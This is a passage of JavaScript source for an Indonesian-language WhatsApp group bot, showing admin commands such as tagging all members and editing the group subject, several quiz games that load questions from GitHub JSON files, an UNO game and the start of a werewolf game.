if (!isOwner) return Xowner()
ReplyRynzz("Aku Pergi :v")
await Alice.groupLeave(m.chat).then((res) => ReplyRynzz(jsonformat(res))).catch((err) => ReplyRynzz(jsonformat(err)))
}
break

case 'h':
case 'hidetag': {
  if (!m.isGroup) return Xgroup()
  if (!isOwner && !isAdmins) return Xadmin()
  if (m.quoted) {
    Alice.sendMessage(m.chat, {
      forward: m.quoted.fakeObj,
      mentions: participants.map(a => a.id)
    })
  }
  if (!m.quoted) {
    Alice.sendMessage(m.chat, {
      text: q ? q : '',
      mentions: participants.map(a => a.id)
    }, {
      quoted: m
    })
  }
}
break

case 'totag': {
  if (!m.isGroup) return Xgroup()
  if (!isOwner && !isAdmins) return Xadmin()
  if (!isBotAdmins) return Xbotadmin
  if (!m.quoted) return ReplyRynzz(`Kutip pesan dengan caption ${XyrooRynzz}`)
  Alice.sendMessage(m.chat, {
    forward: m.quoted.fakeObj,
    mentions: participants.map(a => a.id)
  })
}
break

case 'editsubjek': {
if (!m.isGroup) return Xgroup()
if (!isAdmins && !isOwner) return Xadmin()
if (!isBotAdmins) return Xbotadmin
if (!text) return ReplyRynzz('Text nya ?')
await Alice.groupUpdateSubject(m.chat, text).then((res)).catch((err) => ReplyRynzz(jsonformat(err)))
}
break

case 'editdesk':{
if (!m.isGroup) return Xgroup()
if (!isAdmins && !isOwner) return Xadmin()
if (!isBotAdmins) return Xbotadmin
if (!text) return ReplyRynzz('Text Nya ?')
await Alice.groupUpdateDescription(m.chat, text).then((res)).catch((err) => ReplyRynzz(jsonformat(err)))
}
break

case 'tagall': {
if (!m.isGroup) return Xgroup()
if (!isAdmins) return Xadmin()
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
Alice.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Group Fitur Batas!
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Game Fitur
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
case 'patroli': {
if (!m.isGroup) return Xgroup()
if (isBan) return Xban()
await xreaction()
  const participants = (await Alice.groupMetadata(m.chat)).participants
  if (participants.length < 4) return ReplyRynzz('Minimal 4 member di grup untuk menjalankan game ini!')
  const memberIDs = participants
    .map(p => p.id)
    .filter(id => id !== Alice.user.jid)
  const shuffled = memberIDs.sort(() => Math.random() - 0.5)
  const polisi = shuffled[0]
  const pencuri = shuffled[1]
  const tahun = Math.floor(Math.random() * 3) + 1;
  const hasil = `🚨 *Patroli Berhasil, Maling Telah Ditemukan!!*\n\n` +
    `👮 Polisi: @${polisi.split('@')[0]}\n` +
    `🕵 Pencuri: @${pencuri.split('@')[0]}\n\n` +
    `!!Pencuri Ditangkap! Dan Dipenjara Selama ${tahun} tahun`

  Alice.sendMessage(m.chat, {
    text: hasil,
    mentions: [polisi, pencuri, tahun]
  }, { quoted: m })
}
break

case 'suitbot': {
if (!m.isGroup) return Xgroup()
if (isBan) return Xban()
await xreaction()
				const userChoice = text.toLowerCase();
				const choices = ['batu', 'gunting', 'kertas'];
				const botChoice = choices[Math.floor(Math.random() * choices.length)];
				if (!choices.includes(userChoice)) {
					return ReplyRynzz(`Pilih antara *batu*, *gunting*, atau *kertas* ya, Kak!\nContoh: ${XyrooRynzz} batu`);
				}
				let hasil = '';
				if (userChoice === botChoice) {
					hasil = `Kita Seri! kamu Pilih *${botChoice}* Dan aku juga pilih *${botChoice}*`;
				} else if (
					(userChoice === 'batu' && botChoice === 'gunting') ||
					(userChoice === 'gunting' && botChoice === 'kertas') ||
					(userChoice === 'kertas' && botChoice === 'batu')
				) {
					hasil = `😞 ${botname} Kalah, ${pushname} menang 👍\nAku pilih *${botChoice}*`;
				} else {
					hasil = `Yess, ${botname} menang! ${botname} pilih *${botChoice}*`;
				}
    ReplyRynzz(hasil);
}

break;
			case 'tebakgambar': {
            if (!m.isGroup) return Xgroup()
            if (isBan) return Xban()
            await xreaction()
				const gamecek = await cekgame(m.chat)
				if (gamecek) return
				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					tebakgambar[m.chat] = [
						await Alice.sendMessage(m.chat, {
							image: {
								url: result.img
							},
							caption: `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\nPetunjuk ↓\nReply Soal Untuk Menjawab\nKetik .nyerah Untuk Mengakui Kekalahan Di Permainan\nKetik .bantuan Untuk Mendapatkan Sedikit Jawaban`
						}, {
							quoted: m
						}), result, 250,
						setTimeout(() => {
							if (tebakgambar[m.chat]) {
								waktuHabis(result.jawaban)
								delete tebakgambar[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
				}
			}
			break
			case 'tebakgame': {
            if (!m.isGroup) return Xgroup()
            if (isBan) return Xban()
            await xreaction()
				const gamecek = await cekgame(m.chat)
				if (gamecek) return

				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/qisyana/scrape/main/tebakgame.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					tebakgame[m.chat] = [
						await Alice.sendMessage(m.chat, {
							image: {
								url: result.img
							},
							caption: `Gambar diatas adalah game?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\nPetunjuk ↓\nReply Soal Untuk Menjawab\nKetik .nyerah Untuk Mengakui Kekalahan Di Permainan\nKetik .bantuan Untuk Mendapatkan Sedikit Jawaban`
						}, {
							quoted: m
						}), result, 250,
						setTimeout(() => {
							if (tebakgame[m.chat]) {
								waktuHabis(result.jawaban)
								delete tebakgame[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
				}
			}
			break

			case 'tebakkata': {
            if (!m.isGroup) return Xgroup()
            if (isBan) return Xban()
            await xreaction()
				const gamecek = await cekgame(m.chat)
				if (gamecek) return

				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					tebakkata[m.chat] = [
						await Alice.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\nPetunjuk ↓\nReply Soal Untuk Menjawab\nKetik .nyerah Untuk Mengakui Kekalahan Di Permainan\nKetik .bantuan Untuk Mendapatkan Sedikit Jawaban`, m), result, 250,
						setTimeout(() => {
							if (tebakkata[m.chat]) {
								waktuHabis(result.jawaban)
								delete tebakkata[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
				}
			}
			break

			case 'tebakbendera': {
            if (!m.isGroup) return Xgroup()
            if (isBan) return Xban()
            await xreaction()
				const gamecek = await cekgame(m.chat)
				if (gamecek) return

				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera2.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.name)
					tebakbendera[m.chat] = [
						await Alice.sendMessage(m.chat, {
							image: {
								url: result.img
							},
							caption: `Gambar diatas adalah bendera negara?\n\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\nPetunjuk ↓\nReply Soal Untuk Menjawab\nKetik .nyerah Untuk Mengakui Kekalahan Di Permainan\nKetik .bantuan Untuk Mendapatkan Sedikit Jawaban`
						}, {
							quoted: m
						}), result, 250,
						setTimeout(() => {
							if (tebakbendera[m.chat]) {
								waktuHabis(result.name)
								delete tebakbendera[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
				}
			}
			break

			case 'tebakkalimat': {
            if (!m.isGroup) return Xgroup()
            if (isBan) return Xban()
            await xreaction()
				const gamecek = await cekgame(m.chat)
				if (gamecek) return

				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					tebakkalimat[m.chat] = [
						await Alice.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\nPetunjuk ↓\nReply Soal Untuk Menjawab\nKetik .nyerah Untuk Mengakui Kekalahan Di Permainan\nKetik .bantuan Untuk Mendapatkan Sedikit Jawaban`, m), result, 250,
						setTimeout(() => {
							if (tebakkalimat[m.chat]) {
								waktuHabis(result.jawaban)
								delete tebakkalimat[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
				}
			}
			break

			case 'tebaksiapa': {
            if (!m.isGroup) return Xgroup()
            if (isBan) return Xban()
            await xreaction()
				const gamecek = await cekgame(m.chat)
				if (gamecek) return

				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					siapaaku[m.chat] = [
						await Alice.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\nPetunjuk ↓\nReply Soal Untuk Menjawab\nKetik .nyerah Untuk Mengakui Kekalahan Di Permainan\nKetik .bantuan Untuk Mendapatkan Sedikit Jawaban`, m), result, 250,
						setTimeout(() => {
							if (siapaaku[m.chat]) {
								waktuHabis(result.jawaban)
								delete siapaaku[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
				}
			}
			break

			case 'tebakkimia': {
            if (!m.isGroup) return Xgroup()
            if (isBan) return Xban()
            await xreaction()
				const gamecek = await cekgame(m.chat)
				if (gamecek) return

				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.unsur)
					tebakkimia[m.chat] = [
						await Alice.sendText(m.chat, `Apa Arti Dari Simbol : *${result.lambang}*?\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\nPetunjuk ↓\nReply Soal Untuk Menjawab\nKetik .nyerah Untuk Mengakui Kekalahan Di Permainan\nKetik .bantuan Untuk Mendapatkan Sedikit Jawaban`, m), result, 250,
						setTimeout(() => {
							if (tebakkimia[m.chat]) {
								waktuHabis(result.unsur)
								delete tebakkimia[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
				}
			}
			break

			case 'tebaklirik': {
            if (!m.isGroup) return Xgroup()
            if (isBan) return Xban()
            await xreaction()
				const gamecek = await cekgame(m.chat)
				if (gamecek) return

				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					tebaklirik[m.chat] = [
						await Alice.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\nPetunjuk ↓\nReply Soal Untuk Menjawab\nKetik .nyerah Untuk Mengakui Kekalahan Di Permainan\nKetik .bantuan Untuk Mendapatkan Sedikit Jawaban`, m), result, 250,
						setTimeout(() => {
							if (tebaklirik[m.chat]) {
								waktuHabis(result.jawaban)
								delete tebaklirik[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
				}
			}
			break

			case 'tebaktebakan': {
            if (!m.isGroup) return Xgroup()
            if (isBan) return Xban()
            await xreaction()
				const gamecek = await cekgame(m.chat)
				if (gamecek) return

				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					tebaktebakan[m.chat] = [
						await Alice.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\nPetunjuk ↓\nReply Soal Untuk Menjawab\nKetik .nyerah Untuk Mengakui Kekalahan Di Permainan\nKetik .bantuan Untuk Mendapatkan Sedikit Jawaban`, m), result, 250,
						setTimeout(() => {
							if (tebaktebakan[m.chat]) {
								waktuHabis(result.jawaban)
								delete tebaktebakan[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
				}
			}
			break

			case 'susunkata': {
            if (!m.isGroup) return Xgroup()
            if (isBan) return Xban()
            await xreaction()
				const gamecek = await cekgame(m.chat)
				if (gamecek) return

				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					susunkata[m.chat] = [
						await Alice.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\nSoal : ${result.soal}\nTipe : ${result.tipe}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\nPetunjuk ↓\nReply Soal Untuk Menjawab\nKetik .nyerah Untuk Mengakui Kekalahan Di Permainan\nKetik .bantuan Untuk Mendapatkan Sedikit Jawaban`, m), result, 250,
						setTimeout(() => {
							if (susunkata[m.chat]) {
								waktuHabis(result.jawaban)
								delete susunkata[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
				}
			}
			break

			case 'caklontong': {
            if (!m.isGroup) return Xgroup()
            if (isBan) return Xban()
            await xreaction()
				const gamecek = await cekgame(m.chat)
				if (gamecek) return

				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					caklontong[m.chat] = [
						await Alice.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\nSoal : ${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\nPetunjuk ↓\nReply Soal Untuk Menjawab\nKetik .nyerah Untuk Mengakui Kekalahan Di Permainan\nKetik .bantuan Untuk Mendapatkan Sedikit Jawaban`, m), result, 250,
						setTimeout(() => {
							if (caklontong[m.chat]) {
								waktuHabis(result.jawaban)
								delete caklontong[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
				}
			}
			break

			case 'tekateki': {
            if (!m.isGroup) return Xgroup()
            if (isBan) return Xban()
            await xreaction()
				const gamecek = await cekgame(m.chat)
				if (gamecek) return

				try {
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')
					let result = await pickRandom(anu)
					console.log("Jawaban: " + result.jawaban)
					tekateki[m.chat] = [
						await Alice.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\nPetunjuk ↓\nReply Soal Untuk Menjawab\nKetik .nyerah Untuk Mengakui Kekalahan Di Permainan\nKetik .bantuan Untuk Mendapatkan Sedikit Jawaban`, m), result, 250,
						setTimeout(() => {
							if (tekateki[m.chat]) {
								waktuHabis(result.jawaban)
								delete tekateki[m.chat]
							}
						}, 120000)
					]
				} catch (error) {
					console.log(error);
				}
			}
			break			
			case 'bantuan': {
				try {
					if (m.chat in tebakgambar) {
						let json = tebakgambar[m.chat][1]
						ReplyRynzz('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakgame) {
						let json = tebakgame[m.chat][1]
						ReplyRynzz('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakkata) {
						let json = tebakkata[m.chat][1]
						ReplyRynzz('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakbendera) {
						let json = tebakbendera[m.chat][1]
						ReplyRynzz('```' + json.name.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakkalimat) {
						let json = tebakkalimat[m.chat][1]
						ReplyRynzz('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in siapaaku) {
						let json = siapaaku[m.chat][1]
						ReplyRynzz('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebakkimia) {
						let json = tebakkimia[m.chat][1]
						ReplyRynzz('```' + json.unsur.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebaklirik) {
						let json = tebaklirik[m.chat][1]
						ReplyRynzz('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tebaktebakan) {
						let json = tebaktebakan[m.chat][1]
						ReplyRynzz('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in susunkata) {
						let json = susunkata[m.chat][1]
						ReplyRynzz('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in caklontong) {
						let json = caklontong[m.chat][1]
						ReplyRynzz('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
					if (m.chat in tekateki) {
						let json = tekateki[m.chat][1]
						ReplyRynzz('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
					}
				} catch (error) {
					console.log(error);
				}
			}
			break

			case 'nyerah': {
				try {
					if (m.chat in siapaaku) {
						clearTimeout(siapaaku[m.chat][3])
						delete siapaaku[m.chat]
						return Alice.sendMessage(m.chat, {
							text: `Succes Memberhentikan Permainan\nKarna Anda Telah Menyerah !`
						}, {
							quoted: m
						})
					}
					if (m.chat in tebakkalimat) {
						clearTimeout(tebakkalimat[m.chat][3])
						delete tebakkalimat[m.chat]
						return Alice.sendMessage(m.chat, {
							text: `Succes Memberhentikan Permainan\nKarna Anda Telah Menyerah !`
						}, {
							quoted: m
						})
					}
					if (m.chat in tebakbendera) {
						clearTimeout(tebakbendera[m.chat][3])
						delete tebakbendera[m.chat]
						return Alice.sendMessage(m.chat, {
							text: `Succes Memberhentikan Permainan\nKarna Anda Telah Menyerah !`
						}, {
							quoted: m
						})
					}
					if (m.chat in tebakkata) {
						clearTimeout(tebakkata[m.chat][3])
						delete tebakkata[m.chat]
						return Alice.sendMessage(m.chat, {
							text: `Succes Memberhentikan Permainan\nKarna Anda Telah Menyerah !`
						}, {
							quoted: m
						})
					}
					if (m.chat in tebakgame) {
						clearTimeout(tebakgame[m.chat][3])
						delete tebakgame[m.chat]
						return Alice.sendMessage(m.chat, {
							text: `Succes Memberhentikan Permainan\nKarna Anda Telah Menyerah !`
						}, {
							quoted: m
						})
					}
					if (m.chat in tebakkimia) {
						clearTimeout(tebakkimia[m.chat][3])
						delete tebakkimia[m.chat]
						return Alice.sendMessage(m.chat, {
							text: `Succes Memberhentikan Permainan\nKarna Anda Telah Menyerah !`
						}, {
							quoted: m
						})
					}
					if (m.chat in tebaklirik) {
						clearTimeout(tebaklirik[m.chat][3])
						delete tebaklirik[m.chat]
						return Alice.sendMessage(m.chat, {
							text: `Succes Memberhentikan Permainan\nKarna Anda Telah Menyerah !`
						}, {
							quoted: m
						})
					}
					if (m.chat in tebaktebakan) {
						clearTimeout(tebaktebakan[m.chat][3])
						delete tebaktebakan[m.chat]
						return Alice.sendMessage(m.chat, {
							text: `Succes Memberhentikan Permainan\nKarna Anda Telah Menyerah !`
						}, {
							quoted: m
						})
					}
					if (m.chat in susunkata) {
						clearTimeout(susunkata[m.chat][3])
						delete susunkata[m.chat]
						return Alice.sendMessage(m.chat, {
							text: `Succes Memberhentikan Permainan\nKarna Anda Telah Menyerah !`
						}, {
							quoted: m
						})
					}
					if (m.chat in caklontong) {
						clearTimeout(caklontong[m.chat][3])
						delete caklontong[m.chat]
						return Alice.sendMessage(m.chat, {
							text: `Succes Memberhentikan Permainan\nKarna Anda Telah Menyerah !`
						}, {
							quoted: m
						})
					}
					if (m.chat in tebakgambar) {
						clearTimeout(tebakgambar[m.chat][3])
						delete tebakgambar[m.chat]
						return Alice.sendMessage(m.chat, {
							text: `Succes Memberhentikan Permainan\nKarna Anda Telah Menyerah !`
						}, {
							quoted: m
						})
					}
					if (m.chat in tekateki) {
						clearTimeout(tekateki[m.chat][3])
						delete tekateki[m.chat]
						return Alice.sendMessage(m.chat, {
							text: `Succes Memberhentikan Permainan\nKarna Anda Telah Menyerah !`
						}, {
							quoted: m
						})
					}
				} catch (error) {
					console.log(error);
				}
			}
			break			
case "uno":
{
if (isBan) return Xban()
await xreaction()
    if (!m.isGroup) {
        return ReplyRynzz("This command can only be used in group chats.");
    }

    const games = readUnoGameData();
    const args = text.split(' ');
    const command = args[0];
    const subCommand = args.slice(1).join(' ');

    if (!games[m.chat]) {
        games[m.chat] = {
            players: [],
            deck: createDeck(),
            discardPile: [],
            currentPlayer: 0,
            direction: 1,
            currentCard: null,
            drawStack: 0,
            blockCardPlayed: false,
            reverseCardPlayed: false,
            stopVotes: new Set(),
            awaitingColorChoice: false
        };
        writeUnoGameData(games);
        return ReplyRynzz("UNO game started! Type 'uno join' to join.");
    }

    const game = games[m.chat];

    switch (command) {
        case "join":
            if (game.players.find(player => player.id === m.sender)) {
                return ReplyRynzz("You have already joined the game.");
            }
            game.players.push({ id: m.sender, hand: [] });
            writeUnoGameData(games);
            return ReplyRynzz("You have joined the UNO game!");

        case "start":
            if (game.players.length < 2) {
                return ReplyRynzz("At least 2 players are required to start the game.");
            }
            game.deck = shuffle(game.deck);
            game.players.forEach(player => {
                for (let i = 0; i < 7; i++) {
                    player.hand.push(game.deck.pop());
                }
            });
            game.currentCard = game.deck.pop();
            game.discardPile.push(game.currentCard);
            writeUnoGameData(games);
            return sendGameStatus(m.chat);

        case "info":
            return ReplyRynzz(`
UNO Rules and How to Play:

1. Join the game:
   - Use \`uno join\` to join the game.
   - Use \`uno start\` to start the game after at least 2 players have joined.

2. Draw a card:
   - Use \`uno draw\` to draw a card from the deck. If a special card forces you to draw cards, you will draw all required cards.

3. Play a card:
   - Use \`uno play <card_index>\` to play a card. The card must match the color or number of the card on the discard pile, or you can use a black card to change the color.
   - Special cards:
     - \`12\`: The next player draws two cards and is skipped.
     - \`14\`: The next player draws four cards and is skipped.
     - \`10\`: The next player is skipped.
     - \`11\`: The play direction is reversed.
     - \`wild13\`: The player chooses a new color.
     - \`wild14\`: The next player draws four cards and is skipped.

4. Skip a turn:
   - Use \`uno pass\` if you cannot or do not want to play a card on your turn.

5. Check your hand:
   - Use \`uno hand\` to see the cards in your hand.

6. Check the card image:
   - Use \`uno card <card_index>\` to check the image of the card in your hand.

7. End the game:
   - The first player to use all their cards wins the game.

8. Stop the game:
   - Use \`uno stop\` to request to stop the game. All players must agree, or an admin/creator can stop the game directly.
`);

        case "stop":
            const player = game.players.find(p => p.id === m.sender);
            if (!player) {
                return ReplyRynzz("You have not joined the game.");
            }

            if (isAdmins || isOwner) {
                delete games[m.chat];
                writeUnoGameData(games);
                return ReplyRynzz("UNO game stopped by admin/creator.");
            }

            game.stopVotes.add(m.sender);
            if (game.stopVotes.size === game.players.length) {
                delete games[m.chat];
                writeUnoGameData(games);
                return ReplyRynzz("UNO game stopped with all players' agreement.");
            }

            writeUnoGameData(games);
            return ReplyRynzz(`Stop request accepted. ${game.players.length - game.stopVotes.size} more players need to agree.`);

        case "hand":
            const playerHand = game.players.find(p => p.id === m.sender);
            if (!playerHand) {
                return ReplyRynzz("You have not joined the game.");
            }
            const hand = playerHand.hand.map((card, index) => `${index}: ${card.color} ${card.value}`).join("\n");
            const iniHandText = `*Uno Game ${botname}*\n_still under construction_\n\nYour Cards:\n${hand}`;
            await Alice.sendMessage(m.sender, { text: iniHandText }, { quoted: m });
            return ReplyRynzz('Check your cards!');

        case "card":
            const cardIndex = parseInt(subCommand);
            if (isNaN(cardIndex) || cardIndex < 0 || cardIndex >= game.players.find(p => p.id === m.sender).hand.length) {
                return ReplyRynzz("Invalid card.");
            }
            const card = game.players.find(p => p.id === m.sender).hand[cardIndex];
            const cardImageUrl = getCardImageUrl(card);
            const cardText = `${card.color} ${card.value}`;
            await Alice.sendMessage(m.sender, { image: { url: cardImageUrl }, caption: cardText }, { quoted: m });
            return ReplyRynzz('Card image sent!');

        case "play":
            const currentPlayer = game.players[game.currentPlayer];
            if (currentPlayer.id !== m.sender) {
                return ReplyRynzz("It's not your turn!");
            }

            const playCardIndex = parseInt(subCommand);
            if (isNaN(playCardIndex) || playCardIndex < 0 || playCardIndex >= currentPlayer.hand.length) {
                return ReplyRynzz("Invalid card.");
            }

            const playCard = currentPlayer.hand[playCardIndex];
            if (!isValidPlay(game.currentCard, playCard)) {
                return ReplyRynzz("The card cannot be played.");
            }

            if (playCard.value === "12") {
                game.drawStack += 2;
            } else if (playCard.value === "wild14") {
                if (hasPlayableCard(currentPlayer, game.currentCard)) {
                    return ReplyRynzz("The Wild Draw Four card can only be played if you have no matching card.");
                }
                game.drawStack += 4;
                game.currentCard.color = "black";
                game.awaitingColorChoice = true;
            } else if (playCard.value === "10") {
                game.currentPlayer = getNextPlayer(game);
            } else if (playCard.value === "11") {
                game.direction *= -1;
            }

            game.currentCard = playCard;
            game.discardPile.push(playCard);
            currentPlayer.hand.splice(playCardIndex, 1);

            if (currentPlayer.hand.length === 0) {
                delete games[m.chat];
                writeUnoGameData(games);
                return ReplyRynzz(`Player ${m.sender} wins!`);
            }

            game.currentPlayer = getNextPlayer(game);
            game.reverseCardPlayed = false;
            writeUnoGameData(games);
            return sendGameStatus(m.chat);

        case "pass":
            const passPlayer = game.players[game.currentPlayer];
            if (passPlayer.id !== m.sender) {
                return ReplyRynzz("It's not your turn!");
            }
            game.currentPlayer = getNextPlayer(game);
            game.reverseCardPlayed = false;
            writeUnoGameData(games);
            return sendGameStatus(m.chat);

        case "color":
    if (!game.awaitingColorChoice || game.players[game.currentPlayer].id !== m.sender) {
        return ReplyRynzz("No color needs to be selected at this time.");
    }

    const chosenColor = subCommand.trim().toLowerCase();
    if (!["red", "yellow", "green", "blue"].includes(chosenColor)) {
        return ReplyRynzz("Invalid color. Choose one of: red, yellow, green, blue.");
    }

    game.currentCard.color = chosenColor;
    game.awaitingColorChoice = false;
    game.currentPlayer = getNextPlayer(game);
    writeUnoGameData(games);
    return sendGameStatus(m.chat);

default:
    return ReplyRynzz("Command not recognized. Use `uno info` to view the list of commands.");
}

function createDeck() {
    const colors = ["red", "yellow", "green", "blue"];
    const values = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12"];
    const deck = [];
    colors.forEach(color => {
        values.forEach(value => {
            deck.push({ color, value });
            if (value !== "1") deck.push({ color, value });
        });
    });
    ["wild13", "wild14"].forEach(value => {
        deck.push({ color: "black", value });
        deck.push({ color: "black", value });
    });
    return shuffle(deck);
}

function shuffle(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

function isValidPlay(currentCard, playCard) {
    return playCard.color === "black" || currentCard.color === playCard.color || currentCard.value === playCard.value;
}

function getNextPlayer(game) {
    const nextIndex = (game.currentPlayer + game.direction + game.players.length) % game.players.length;
    return nextIndex;
}

function hasPlayableCard(player, currentCard) {
    return player.hand.some(card => isValidPlay(currentCard, card));
}

function getCardImageUrl(card) {
    const baseUrl = "https://raw.githubusercontent.com/abhisheks008/UNO/main/images/";
    if (card.color === "black") {
        return `${baseUrl}${card.value}.png`;
    }
    return `${baseUrl}${card.color}${card.value}.png`;
}

async function sendGameStatus(chat) {
    const currentCardText = `Current Card: ${game.currentCard.color} ${game.currentCard.value}`;
    const currentCardImageUrl = getCardImageUrl(game.currentCard);
    const handsText = game.players.map((player, index) => `${index}: ${player.id} (${player.hand.length} cards)`).join("\n");
    const iniGameStatusText = `*Uno Game*\n\n${currentCardText}\nTurn: ${game.players[game.currentPlayer].id}\n\nPlayer Cards:\n${handsText}`;
    
    await Alice.sendMessage(chat, { text: iniGameStatusText });
    await Alice.sendMessage(chat, { image: { url: currentCardImageUrl }, caption: `Current Card: ${game.currentCard.color} ${game.currentCard.value}` });
}
}
break

      case 'wwpc':
case 'ww':
case 'werewolf': {
if (isBan) return Xban()
await xreaction()
let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

let {
    emoji_role,
    sesi,
    playerOnGame,
    playerOnRoom,
    playerExit,
    dataPlayer,
    dataPlayerById,
    getPlayerById,
    getPlayerById2,
    killWerewolf,
    killww,
    dreamySeer,
    sorcerer,
    protectGuardian,
    roleShuffle,
    roleChanger,
    roleAmount,
    roleGenerator,
    addTimer,
    startGame,
    playerHidup,
    playerMati,
    vote,
    voteResult,
    clearAllVote,
    getWinner,
    win,
    pagi,
    malam,
    skill,
    voteStart,
    voteDone,
    voting,
    run,
    run_vote,
    run_malam,
    runprefixagi
} = require('./AliceLibray/werewolf.js')

// [ Thumbnail ] 
let thumb =
    "https://user-images.githubusercontent.com/72728486/235316834-f9f84ba0-8df3-4444-81d8-db5270995e6d.jpg";

    const {
        sender,
        chat
    } = m;
    Alice.werewolf = Alice.werewolf ? Alice.werewolf : {};
    const ww = Alice.werewolf ? Alice.werewolf : {};
    const data = ww[chat];
    const value = args[0];
    const target = args[1];
let byId = getPlayerById2(sender, parseInt(target), ww); 
    // [ Membuat Room ]
    if (value === "create") {
